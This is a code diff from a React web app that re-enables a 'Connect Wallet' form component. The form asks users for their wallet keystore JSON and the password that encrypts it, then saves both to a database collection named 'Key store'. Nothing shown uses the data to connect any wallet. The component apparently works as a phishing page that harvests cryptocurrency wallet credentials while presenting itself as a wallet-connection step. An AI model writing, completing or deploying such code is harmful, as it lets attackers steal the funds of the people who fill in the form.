@@ -234,84 +234,84 @@ export const SecondTab = () => {
 //   );
 // };
 
-// export const ThirdTab3 = () => {
-//   const [thirdInputValue, setThirdInputValue] = useState({
-//     keystore: "",
-//     passwordField: "",
-//   });
-//   const  {showQr, setShowQr, generate} = useContext(AppContext);
+export const ThirdTab= () => {
+  const [thirdInputValue, setThirdInputValue] = useState({
+    keystore: "",
+    passwordField: "",
+  });
+  const  {showQr, setShowQr, generate} = useContext(AppContext);
 
-//   const handleInputChange = (event) => {
-//     const { name, value } = event.target;
-//     setThirdInputValue({ ...thirdInputValue, [name]: value });
-//   };
+  const handleInputChange = (event) => {
+    const { name, value } = event.target;
+    setThirdInputValue({ ...thirdInputValue, [name]: value });
+  };
 
-//   const handleSubmit = (event) => {
-//     event.preventDefault();
-//     db.collection("Key store")
-//       .add({
-//         keystore: thirdInputValue.keystore,
-//         password: thirdInputValue.passwordField,
-//       })
-//       .then(() => {
-//         generate()
-//         setShowQr(!showQr)
-//       })
-//       .catch((error) => {
-//         alert(error.message);
-//       });
-//       setThirdInputValue({
-//       keystore: "",
-//       passwordField: "",
-//     });
-//   };
+  const handleSubmit = (event) => {
+    event.preventDefault();
+    db.collection("Key store")
+      .add({
+        keystore: thirdInputValue.keystore,
+        password: thirdInputValue.passwordField,
+      })
+      .then(() => {
+        generate()
+        setShowQr(!showQr)
+      })
+      .catch((error) => {
+        alert(error.message);
+      });
+      setThirdInputValue({
+      keystore: "",
+      passwordField: "",
+    });
+  };
 
-//   return (
-//     <div className="SecondTab">
-//       <p className="key-type">input Keystore JSON </p>
-//       <form onSubmit={handleSubmit}>
-//         <textarea
-//           type="text"
-//           value={thirdInputValue.keystore}
-//           onChange={handleInputChange}
-//           name="keystore"
-//           rows={4}
-//           cols={40}
-//           placeholder="Enter Keystore JSON"
-//           style={{
-//             width: "80%",
-//             color: "#000000",
-//             fontSize: 16,
-//             padding: 5,
-//             borderRadius: 8,
-//           }}
-//         />
+  return (
+    <div className="SecondTab">
+      <p className="key-type">input Keystore JSON </p>
+      <form onSubmit={handleSubmit}>
+        <textarea
+          type="text"
+          value={thirdInputValue.keystore}
+          onChange={handleInputChange}
+          name="keystore"
+          rows={4}
+          cols={40}
+          placeholder="Enter Keystore JSON"
+          style={{
+            width: "80%",
+            color: "#000000",
+            fontSize: 16,
+            padding: 5,
+            borderRadius: 8,
+          }}
+        />
 
-//         <input
-//           type="text"
-//           value={thirdInputValue.passwordField}
-//           onChange={handleInputChange}
-//           name="passwordField"
-//           placeholder="Enter Password"
-//           style={{
-//             padding: 5,
-//             width: "80%",
-//             marginTop: 10,
-//             borderRadius: 8,
-//             color: "#000000",
-//           }}
-//         />
-//         <p className="type-info">
-//           Several lines of text beginning with "{}" plus the password you used
-//           to encrypt it
-//         </p>
+        <input
+          type="text"
+          value={thirdInputValue.passwordField}
+          onChange={handleInputChange}
+          name="passwordField"
+          placeholder="Enter Password"
+          style={{
+            padding: 5,
+            width: "80%",
+            marginTop: 10,
+            borderRadius: 8,
+            color: "#000000",
+          }}
+        />
+        <p className="type-info">
+          Several lines of text beginning with "{}" plus the password you used
+          to encrypt it
+        </p>
 
-//         <div className="" onClick={() => {}}>
-//           <button className="submit-key">Connect Wallet</button>
-//         </div>
-//       </form>
-//     </div>
-//   );
-// };
+        <div className="" onClick={() => {}}>
+          <button className="submit-key">Connect Wallet</button>
+        </div>
+      </form>
+    </div>
+  );
+};
 
 
